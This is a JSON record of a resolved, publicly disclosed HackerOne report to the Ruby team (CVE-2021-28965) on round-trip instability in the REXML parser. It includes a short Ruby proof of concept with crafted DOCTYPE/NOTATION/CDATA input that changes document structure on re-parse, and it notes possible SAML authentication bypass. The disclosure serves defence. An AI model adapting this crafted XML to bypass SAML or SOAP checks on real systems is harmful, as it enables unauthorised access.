{
  "id": 1104077,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA0MDc3",
  "url": "https://hackerone.com/reports/1104077",
  "title": "Round-trip instability in REXML",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-02-16T08:10:08.579Z",
  "submitted_at": "2021-02-16T08:10:08.618Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jupenur",
    "url": "/jupenur",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2021-28965"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-04-15T09:44:48.486Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-15T09:44:48.396Z",
  "team_member_agreed_on_going_public_at": "2021-04-07T11:43:45.991Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Submitted previously via email to security@ruby-lang.org due to REXML not being listed under in-scope assets here. Explicitly requested by @hsbt to re-submit through HackerOne.**\n\n**CVSS rating calculated based on confirmed downstream impact.**\n\n---\n\nHi Ruby Security Team,\n\nI'm reaching out to you to report a vulnerability in REXML that renders downstream use-cases susceptible to varying degrees of tampering.\n\nConceptually the vulnerability is similar to Go encoding/xml bugs publicly disclosed in December. For context, high-level descriptions of those vulnerabilities can be found in the blog post at https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/ and in the advisories it references.\n\nIn the case of REXML, the specific vulnerability is best explained using a code example:\n\n```Ruby\nrequire 'rexml/document'\n\ndoc = REXML::Document.new <<XML\n<!DOCTYPE x [ <!NOTATION x SYSTEM 'x\">]><!--'> ]>\n<X>\n  <Y/><![CDATA[--><X><Z/><!--]]>-->\n</X>\nXML\n\nputs \"First child in original doc: \" + doc.root.elements[1].name\ndoc = REXML::Document.new doc.to_s\nputs \"First child after round-trip: \" + doc.root.elements[1].name\n```\n\nThis program prints two lines of text:\n\n```\nFirst child in original doc: Y\nFirst child after round-trip: Z\n```\n\nThe output demonstrates how the structure of an XML document can change when parsed and serialized using REXML. The expected output from a well-behaving parser would be such where both lines end with \"Y\".\n\nRegards,\n\nJuho Nurminen\nStaff Product Security Engineer, Mattermost, Inc.\n\n## Impact\n\nThe impact of XML round-trip issues can vary significantly depending on context. SAML implementations affected by such issues can allow authentication bypasses and privilege escalation. SOAP endpoints can allow circumventing business logic or access controls. And in general XML processing loses integrity guarantees.\n\n**We are aware of a major SAML implementation affected by this vulnerability**, resulting in critical impact in all applications that rely on it. The vulnerability has not been reported to the downstream maintainers since it is an issue in REXML.",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-05-07T11:43:46.111Z",
  "allow_singular_disclosure_after": -87445323.64351735,
  "singular_disclosure_allowed": true,
  "vote_count": 20,
  "voters": [
    "joernchen",
    "battle_angel",
    "foobar7",
    "prakash142",
    "nikitastupin",
    "demonia",
    "xaleraf4ra",
    "shivammusic",
    "t3chnophil3",
    "sg_1",
    "and 10 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
